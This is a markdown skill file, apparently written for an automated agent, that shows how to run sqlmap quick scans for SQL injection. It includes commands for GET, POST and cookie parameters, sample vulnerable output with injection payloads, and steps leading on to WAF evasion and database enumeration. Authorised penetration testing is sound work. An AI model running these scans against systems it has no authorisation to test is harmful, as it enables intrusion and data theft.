# Skill: Quick Scan

## Metadata
- Phase: detection
- Techniques: B, T, E, U, S, Q (all)
- DB Targets: all
- Risk Level: low
- Prerequisites: target URL with parameter, authorization

## When to Use

Always start here. The quick scan is the first injection attempt on a target. It tests all techniques at the lowest level/risk settings to minimize traffic while still identifying the most common vulnerabilities. Results determine which specialized skill to use next.

## Minimum Viable Command

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

## Recommended Full Command

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --batch \
  --level=1 \
  --risk=1 \
  --dbms=mysql \
  --random-agent \
  -v 2
```

## With Burp Request File (Most Reliable)

```bash
# Save request from Burp: Right-click -> "Save item"
sqlmap -r burp_request.txt \
  --batch \
  --level=1 \
  --risk=1 \
  -v 2
```

## POST Parameter Testing

```bash
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  --batch \
  --level=1 \
  --risk=1
```

## Cookie Testing

```bash
sqlmap -u "http://target.com/dashboard" \
  --cookie="user_id=1; session=abc123" \
  --level=2 \
  --batch
```

Note: `--level=2` required to test cookies.

## Authenticated Session

```bash
sqlmap -u "http://target.com/admin/items?id=1" \
  --cookie="PHPSESSID=abc123def456" \
  --batch \
  --level=1
```

## Step-by-Step

1. Run minimum viable command
2. Watch for "is vulnerable" messages
3. Note which technique SQLMap reports as working
4. If blocked (403/WAF), proceed to WAF evasion
5. If injection found, proceed to exploitation

## Expected Output (Vulnerable)
```
[12:00:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:00:02] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
...
[12:00:15] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
sqlmap identified the following injection point(s):
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8389=8389

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 9285 FROM(SELECT COUNT(*),CONCAT(0x716a7a7671,(SELECT (ELT(9285=9285,1))),0x71766b7671,FLOOR(RAND(0)*2))x FROM information_schema.TABLES GROUP BY x)a)
---
```

## Expected Output (WAF Blocking)
```
[WARNING] the web server responded with an HTTP error code (403) which could mean that the requested URL and/or parameters are not within the scope
[WARNING] heuristic (basic) test shows that the target might be protected by some kind of WAF/IPS
```

## Expected Output (Not Vulnerable)
```
[WARNING] GET parameter 'id' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

## Red Flags (wrong skill)
- App requires authentication and you haven't set cookies -> add `--cookie`
- CAPTCHA appearing -> manual testing needed, or use `--second-url`
- All parameters return same response -> may not be injectable, or need higher `--level`

## Follow-Up
- Injection found -> [Database Enumeration](../03_exploitation/database_enumeration.md)
- WAF detected -> [WAF Identification](../02_waf_evasion/waf_identification.md)
- Not found, want deeper scan -> increase to `--level=3 --risk=2`
- Specific technique found -> use targeted skill file for that technique
